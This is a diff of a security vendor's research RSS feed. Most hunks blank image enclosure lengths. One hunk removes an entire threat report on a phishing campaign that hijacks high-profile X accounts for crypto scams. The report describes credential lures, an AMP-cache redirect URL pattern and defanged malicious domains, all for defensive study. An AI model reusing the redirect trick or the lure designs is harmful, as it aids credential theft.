 		<title>AkiraBot &#124; AI-Powered Bot Bypasses CAPTCHAs, Spams Websites At Scale</title>
 		<link>https://www.sentinelone.com/labs/akirabot-ai-powered-bot-bypasses-captchas-spams-websites-at-scale/</link>
@@ -1088,7 +1490,7 @@ fb7fdcc2fe11e95065a0ce9041348984427ca0f4</p>
 					
 		
 		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot-ftr.jpg" length="614617" type="image/jpeg" />	</item>
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot-ftr.jpg" length="" type="image/jpeg" />	</item>
 		<item>
 		<title>LABScon24 Replay &#124; A Walking Red Flag (With Yellow Stars)</title>
 		<link>https://www.sentinelone.com/labs/labscon24-replay-a-walking-red-flag-with-yellow-stars/</link>
@@ -1114,7 +1516,7 @@ fb7fdcc2fe11e95065a0ce9041348984427ca0f4</p>
 					
 		
 		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Dakota_LABScon24-ftr.jpg" length="613749" type="image/jpeg" />	</item>
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Dakota_LABScon24-ftr.jpg" length="" type="image/jpeg" />	</item>
 		<item>
 		<title>LABScon24 Replay &#124; Kryptina RaaS: From Unsellable Cast-off to Enterprise Ransomware</title>
 		<link>https://www.sentinelone.com/labs/labscon24-replay-kryptina-raas-from-unsellable-cast-off-to-enterprise-ransomware/</link>
@@ -1139,7 +1541,7 @@ fb7fdcc2fe11e95065a0ce9041348984427ca0f4</p>
 					
 		
 		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Jim-LABScon24-ftr.jpg" length="73546" type="image/jpeg" />	</item>
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Jim-LABScon24-ftr.jpg" length="" type="image/jpeg" />	</item>
 		<item>
 		<title>LABScon24 Replay &#124; Resilience and Protection in the Windows Ecosystem</title>
 		<link>https://www.sentinelone.com/labs/labscon24-replay-resilience-and-protection-in-the-windows-ecosystem/</link>
@@ -1164,7 +1566,7 @@ fb7fdcc2fe11e95065a0ce9041348984427ca0f4</p>
 					
 		
 		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/weston-ftr.jpg" length="596345" type="image/jpeg" />	</item>
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/weston-ftr.jpg" length="" type="image/jpeg" />	</item>
 		<item>
 		<title>LABScon24 Replay &#124; Farmyard Gossip: The Foreign Footprint in US Agriculture</title>
 		<link>https://www.sentinelone.com/labs/labscon24-replay-farmyard-gossip-the-foreign-footprint-in-us-agriculture/</link>
@@ -1189,7 +1591,7 @@ fb7fdcc2fe11e95065a0ce9041348984427ca0f4</p>
 					
 		
 		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/farmyard_gossip-ftr.jpg" length="576096" type="image/jpeg" />	</item>
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/farmyard_gossip-ftr.jpg" length="" type="image/jpeg" />	</item>
 		<item>
 		<title>Ghostwriter &#124; New Campaign Targets Ukrainian Government and Belarusian Opposition</title>
 		<link>https://www.sentinelone.com/labs/ghostwriter-new-campaign-targets-ukrainian-government-and-belarusian-opposition/</link>
@@ -1409,7 +1811,7 @@ sciencealert[.]shop
 					
 		
 		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter-ftr.jpg" length="411675" type="image/jpeg" />	</item>
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter-ftr.jpg" length="" type="image/jpeg" />	</item>
 		<item>
 		<title>Censorship as a Service &#124; Leak Reveals Public-Private Collaboration to Monitor Chinese Cyberspace</title>
 		<link>https://www.sentinelone.com/labs/censorship-as-a-service-leak-reveals-public-private-collaboration-to-monitor-chinese-cyberspace/</link>
@@ -1535,106 +1937,6 @@ Assist the product to check for missed scans and manual analysis and marking err
 					
 		
 		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/CasS-Leaks-ftr.jpg" length="604370" type="image/jpeg" />	</item>
-		<item>
-		<title>X Phishing &#124; Campaign Targeting High Profile Accounts Returns, Promoting Crypto Scams</title>
-		<link>https://www.sentinelone.com/labs/phishing-on-x-high-profile-account-targeting-campaign-returns/</link>
-		
-		<dc:creator><![CDATA[Tom Hegel, Jim Walter &amp; Alex Delamotte]]></dc:creator>
-		<pubDate>Fri, 31 Jan 2025 14:55:46 +0000</pubDate>
-				<category><![CDATA[cryptocurrency]]></category>
-		<category><![CDATA[phishing]]></category>
-		<category><![CDATA[Scam]]></category>
-		<category><![CDATA[twitter]]></category>
-		<category><![CDATA[x]]></category>
-		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=113618</guid>
-
-					<description><![CDATA[SentinelLABS has observed an active phishing campaign targeting high-profile X accounts to hijack and exploit them for fraudulent activity.]]></description>
-										<content:encoded><![CDATA[<h2>Executive Summary</h2>
-<ul>
-<li>An active phishing campaign is targeting high-profile X accounts in an attempt to hijack and exploit them for fraudulent activity.</li>
-<li>This campaign has been observed targeting a variety of individual and organization accounts such as U.S. political figures, leading international journalists, an X employee, large technology organizations, cryptocurrency organizations, and owners of valuable, short usernames.</li>
-<li>SentinelLABS’ analysis links this activity to a similar operation from last year that successfully compromised multiple accounts to spread scam content with financial objectives. While the activity detailed here is centered around X/Twitter accounts, this actor is not limited to a single social platform, and can be observed directing attention to other popular services as well, while seemingly pursuing the same financial objectives.</li>
-</ul>
-<p>If you’ve encountered similar suspicious activity, SentinelLABS would love to hear from you — please reach out to the team at <a href="mailto:ThreatTips@sentinelone.com" target="_blank" rel="noopener noreferrer">ThreatTips@sentinelone.com</a>.</p>
-<h2>Account Compromise Process</h2>
-<p>Thanks to tips from targets and collaboration with industry partners, SentinelLABS has observed a variety of phishing lures tied to this campaign over the past few weeks. One example is the classic account login notice. The links in the email received by the target are not legitimate and lead to credential phishing sites. Other observed lures use copyright violation themes. However, SentinelLABS notes that directly phishing users may not be the only access method employed by this attacker.</p>
-<figure id="attachment_113633" aria-describedby="caption-attachment-113633" style="width: 760px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="wp-image-113633 size-full" src="https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email.jpg" alt="" width="760" height="1320" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email.jpg 760w, https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email-173x300.jpg 173w, https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email-590x1024.jpg 590w" sizes="auto, (max-width: 760px) 100vw, 760px" /><figcaption id="caption-attachment-113633" class="wp-caption-text">An X ‘new login’-themed phishing email</figcaption></figure>
-<p>In recent cases, we observed the actor abusing Google&#8217;s &#8220;AMP Cache&#8221; domain <code>cdn.ampproject[.]org</code> to evade email detections and redirect the user to a phishing domain:</p>
-<pre>https://cdn.ampproject[.]org/c/s/x-recoverysupport.com/reset/?username=[X-USERNAME]</pre>
-<p>This ultimately leads the targets to an actor-made phishing website seeking X account credentials:</p>
-<figure id="attachment_113632" aria-describedby="caption-attachment-113632" style="width: 684px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="wp-image-113632 size-full" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-creds-phishing-page.jpg" alt="" width="684" height="792" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/x-creds-phishing-page.jpg 684w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-creds-phishing-page-259x300.jpg 259w" sizes="auto, (max-width: 684px) 100vw, 684px" /><figcaption id="caption-attachment-113632" class="wp-caption-text">X credential phishing page</figcaption></figure>
-<p>In the copyright infringement lure scenario, the user will first visit an Action Needed page before being prompted to enter credentials:</p>
-<figure id="attachment_113631" aria-describedby="caption-attachment-113631" style="width: 1514px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113631" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement.jpg" alt="" width="1514" height="786" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement.jpg 1514w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement-300x156.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement-1024x532.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement-768x399.jpg 768w" sizes="auto, (max-width: 1514px) 100vw, 1514px" /><figcaption id="caption-attachment-113631" class="wp-caption-text">X fake copyright infringement page</figcaption></figure>
-<p>Once an account is taken over, the attacker swiftly locks out the legitimate owner and begins posting fraudulent cryptocurrency opportunities or links to external sites designed to lure additional targets, often with a crypto theft-related theme. Ultimately, compromising high-profile accounts enables the attacker to reach a broader audience of potential secondary victims, maximizing their financial gains.</p>
-<h2>Widespread Activity</h2>
-<p>In recent activity associated with this campaign, the domain <code>securelogins-x[.]com</code> has been used to deliver emails and <code>x-recoverysupport[.]com</code> to host phishing pages. Our observations indicate a level of informality and flexibility of infrastructure use – meaning any of these domains can be considered email delivery or phishing page hosting.</p>
-<p>An overall collection of recent activity can be observed hosted on <code>84.38.130[.]20</code>, an IP associated with a Belize-based VPS service called Dataclub. The domains themselves have been predominantly registered through Turkish hosting provider Turkticaret.</p>
-<p>Inspecting the DNS history of <code>84.38.130[.]20</code> leads to a variety of interestingly related domains. As shown below, the cluster of activity began in mid-2024 and continues today. While this is only one phishing page hosting IP, it provides a good perspective of the length of this activity and its ability to avoid much attention for over a year.</p>
-<figure id="attachment_113630" aria-describedby="caption-attachment-113630" style="width: 1558px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113630" src="https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis.jpg" alt="" width="1558" height="886" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis.jpg 1558w, https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis-300x171.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis-1024x582.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis-768x437.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis-1536x873.jpg 1536w" sizes="auto, (max-width: 1558px) 100vw, 1558px" /><figcaption id="caption-attachment-113630" class="wp-caption-text">Validin Infrastructure Analysis Timeline</figcaption></figure>
-<p>Our observations suggest that the attacker is highly adaptable, continuously exploring new techniques while maintaining a clear financial motive. The targeting appears constrained, yet opportunistic. Notably, past public reports have attributed related activity to Turkish-speaking actors based on language phishing page source comment language. At this time, we do not attribute this campaign to a specific country or any widely-tracked threat actor.</p>
-<p>Some of the malicious sites and content hosted across <code>84.38.130[.]20</code> are built using the FASTPANEL DIRECT service.</p>
-<figure id="attachment_113629" aria-describedby="caption-attachment-113629" style="width: 1046px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113629" src="https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page.jpg" alt="" width="1046" height="836" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page.jpg 1046w, https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page-300x240.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page-1024x818.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page-768x614.jpg 768w" sizes="auto, (max-width: 1046px) 100vw, 1046px" /><figcaption id="caption-attachment-113629" class="wp-caption-text">FASTPANEL landing page on buy-tanai[.]com</figcaption></figure>
-<p>FASTPANEL is a website hosting and building service that specializes in rapid building and management of websites. While FASTPANEL is not a malicious service, it is frequently abused by bad actors due to the ease of use, rapid scalability, and relatively low cost. FASTPANEL is routinely utilized by drainer gains and phishing campaigns, and is also included in associated guides and tutorials distributed throughout cybercrime communication channels.</p>
-<figure id="attachment_113628" aria-describedby="caption-attachment-113628" style="width: 1556px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113628" src="https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL.jpg" alt="" width="1556" height="664" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL.jpg 1556w, https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL-300x128.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL-1024x437.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL-768x328.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL-1536x655.jpg 1536w" sizes="auto, (max-width: 1556px) 100vw, 1556px" /><figcaption id="caption-attachment-113628" class="wp-caption-text">Example discussion of FASTPANEL (RU crime forum)</figcaption></figure>
-<p>Of the sites hosted on <code>84.38.130[.]20</code>, the <code>buy-tanai[.]com</code> and <code>emotionai[.]live</code> sites still present the FASTPANEL landing pages as of this writing.</p>
-<h2>Publicly Linkable Activity</h2>
-<h3>Emerging Account Intrusions</h3>
-<p>While we have not yet established a high-confidence link, a recent compromise of a Tor Project account closely mirrors our observations. On January 30, 2025, the official X account for the Tor Project was breached. While it is possible that the same threat actor is responsible, we lack sufficient evidence to confirm the connection as of this writing.</p>
-<figure id="attachment_113627" aria-describedby="caption-attachment-113627" style="width: 1534px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113627" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp.jpg" alt="" width="1534" height="1018" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp.jpg 1534w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp-300x199.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp-1024x680.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp-768x510.jpg 768w" sizes="auto, (max-width: 1534px) 100vw, 1534px" /><figcaption id="caption-attachment-113627" class="wp-caption-text">X post from The Tor Project account on January 30, 2025 advising users of a potential compromise</figcaption></figure>
-<figure id="attachment_113626" aria-describedby="caption-attachment-113626" style="width: 1522px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="wp-image-113626 size-full" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice.jpg" alt="" width="1522" height="762" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice.jpg 1522w, https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice-300x150.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice-1024x513.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice-768x385.jpg 768w" sizes="auto, (max-width: 1522px) 100vw, 1522px" /><figcaption id="caption-attachment-113626" class="wp-caption-text">Tor Project account compromise notice</figcaption></figure>
-<p>The Decentralized Autonomous Wireless Network (DAWN) was another victim of this type of attack. The threat actor <a href="https://coinpedia.org/news/dawn-internets-x-account-hacked-phishing-scams-target-users-via-telegram/" target="_blank" rel="noopener noreferrer">leveraged</a> the compromised DAWN-related social media accounts to lure victims into entering credentials into phishing pages targeting X and Telegram credentials.</p>
-<figure id="attachment_113625" aria-describedby="caption-attachment-113625" style="width: 1354px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113625" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post.jpg" alt="" width="1354" height="1358" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post.jpg 1354w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-300x300.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-1021x1024.jpg 1021w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-150x150.jpg 150w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-768x770.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-50x50.jpg 50w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-24x24.jpg 24w" sizes="auto, (max-width: 1354px) 100vw, 1354px" /><figcaption id="caption-attachment-113625" class="wp-caption-text">DAWN X Posts</figcaption></figure>
-<p>The compromise of DAWN’s X accounts goes back to mid-January 2025.</p>
-<figure id="attachment_113624" aria-describedby="caption-attachment-113624" style="width: 960px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113624" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post.jpg" alt="" width="960" height="1106" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post.jpg 960w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post-260x300.jpg 260w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post-889x1024.jpg 889w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post-768x885.jpg 768w" sizes="auto, (max-width: 960px) 100vw, 960px" /><figcaption id="caption-attachment-113624" class="wp-caption-text">January 14, 2025 &#8211; DAWN rewards compromise post</figcaption></figure>
-<h3>Crypto-Themed Project Placeholders</h3>
-<p>In some cases, we’ve observed cryptocurrency themed projects seemingly acting as placeholders for future use, or direct pump-and-dump schemes. In one example, <code>buy-tanai[.]com</code> was <a href="https://pump.fun/coin/G8pMUeoRVVDQu2hJSzxNPBGWtgtt5BjQ9nCT2BmVpump" target="_blank" rel="noopener noreferrer">pitched</a> as such: “<i>$TANA AI. Dawn&#8217;s AI project, Tana is the first AI-powered LP and trading agent, now live on the Solana blockchain.”</i></p>
-<figure id="attachment_113623" aria-describedby="caption-attachment-113623" style="width: 1516px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113623" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun.jpg" alt="" width="1516" height="338" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun.jpg 1516w, https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun-300x67.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun-1024x228.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun-768x171.jpg 768w" sizes="auto, (max-width: 1516px) 100vw, 1516px" /><figcaption id="caption-attachment-113623" class="wp-caption-text">Tana AI (TANA) on Pump[.]fun</figcaption></figure>
-<p>The domain<code>buy-tanai[.]com</code> currently displays default FASTPANEL landing pages, suggesting it — along with other similar domains — is being staged for future attacks. Since FASTPANEL-managed sites can be rapidly updated, these domains serve as adaptable templates for phishing campaigns.</p>
-<p>Notably, TANA AI (TANA) was launched by Dawn in mid-January to promote AI-driven trading and liquidity provision in the cryptocurrency market. Despite losing most of its initial value within days, the currency remains actively traded across multiple decentralized exchanges.</p>
-<p>Given the crypto-related nature of these domains, it is likely that threat actors are using them as flexible phishing infrastructure. By keeping them as blank templates, they can quickly modify hosted content to align with ongoing campaigns as needed.</p>
-<h3>Crimeware Relations</h3>
-<p>Several other domains share overlaps in both use and unique infrastructure details, yet they represent a fork from the previously described high-profile social media profile attacks, including:</p>
-<ul>
-<li aria-level="1">dataoptimix[.]com</li>
-<li aria-level="1">gamecodestudios[.]com</li>
-<li aria-level="1">shortwayscooter[.]com</li>
-</ul>
-<p>The domain <code>shortwayscooter[.]com</code> <a href="https://x.com/JAMESWT_MHT/status/1883780543797723223" target="_blank" rel="noopener noreferrer">hosts</a> fake captchas that deliver the DanaBot banking trojan. DataOptimix is branded as a generative AI solution, though there are few details about what the service does.</p>
-<figure id="attachment_113622" aria-describedby="caption-attachment-113622" style="width: 1474px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113622" src="https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix.jpg" alt="" width="1474" height="1236" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix.jpg 1474w, https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix-300x252.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix-1024x859.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix-768x644.jpg 768w" sizes="auto, (max-width: 1474px) 100vw, 1474px" /><figcaption id="caption-attachment-113622" class="wp-caption-text">DataOptimix</figcaption></figure>
-<h3>Historical Connections</h3>
-<p>In mid-2024, a campaign used related infrastructure in similar phishing messages, including those which <a href="https://www.sportskeeda.com/us/streamers/news-linus-sebastian-responds-linus-tech-tips-official-x-account-got-hacked" target="_blank" rel="noopener noreferrer">compromised the Linus Tech Tips</a> Twitter account along with several other high profile users. At the time, @LinusTech had roughly 1.8million followers, which may represent the highest profile account successfully hijacked and linked to this actor.</p>
-<figure id="attachment_113621" aria-describedby="caption-attachment-113621" style="width: 852px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113621" src="https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise.jpg" alt="" width="852" height="1556" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise.jpg 852w, https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise-164x300.jpg 164w, https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise-561x1024.jpg 561w, https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise-768x1403.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise-841x1536.jpg 841w" sizes="auto, (max-width: 852px) 100vw, 852px" /><figcaption id="caption-attachment-113621" class="wp-caption-text">Linus Tech Tips Twitter compromise</figcaption></figure>
-<h2>Conclusion</h2>
-<p>The cryptocurrency landscape offers financially-motivated threat actors multiple opportunities for profit and fraud. While marketing for coins and tokens has long been irreverent and meme-driven, recent developments have further blurred the line between legitimate projects and scams. </p>
-<p>A striking example occurred in January 2025, when the X account of the late crypto-enthusiast and antivirus founder John McAfee was reactivated to promote a new coin, <a href="https://cryptoslate.com/john-mcafee-reborn-as-ai-memecoin-and-chatbot-with-27-million-market-cap/" target="_blank" rel="noopener noreferrer">$AIntivirus</a>. The marketing style and brand voice of this purportedly legitimate token closely resemble tactics used in known scam campaigns, highlighting how easily crypto enthusiasts can be misled in an already murky ecosystem.</p>
-<p>To safeguard your X account, we strongly recommend using a unique password, enabling two-factor authentication (2FA), and avoiding credential sharing with third-party services. Be especially cautious of messages containing links to account alerts or security notices. Always verify URLs before clicking, and if a password reset is needed, initiate it directly through the official website or app rather than relying on unsolicited links.</p>
-<p>If you’ve encountered similar suspicious activity, we’d love to hear from you. Contact SentinelLABS at <a href="mailto:ThreatTips@sentinelone.com" target="_blank" rel="noopener noreferrer">ThreatTips@sentinelone.com</a>.</p>
-<h2>Indicators of Compromise</h2>
-<p><b>Domains</b><br />
-buy-tanai[.]com<br />
-dataoptimix[.]com<br />
-gamecodestudios[.]com<br />
-infringe-x[.]com<br />
-protection-x[.]com<br />
-rewards-dawn[.]com<br />
-securelogins-x[.]xyz<br />
-shortwayscooter[.]com<br />
-violationappeal-x[.]com<br />
-violationcenter-x[.]com<br />
-x-accountcenter[.]com<br />
-x-changealerts[.]com<br />
-x-logincheck[.]com<br />
-x-loginhelp[.]com<br />
-x-passwordrecovery[.]com<br />
-x-recoveraccount[.]com<br />
-x-suspiciouslogin[.]com</p>
-<p><b>SHA-1</b><br />
-e2221e5c58a1a976e59fe1062c6db36d4951b81e &#8211; PHP file containing URL associated with X credential phishing activity</p>
-]]></content:encoded>
-					
-		
-		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/01/Phishing-on-X-High-Profile-Account-Targeting-Campaign-Returns-Promoting-Cryptocurrency-Scams-2.jpg" length="95469" type="image/jpeg" />	</item>
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/CasS-Leaks-ftr.jpg" length="" type="image/jpeg" />	</item>
 	</channel>
 </rss>
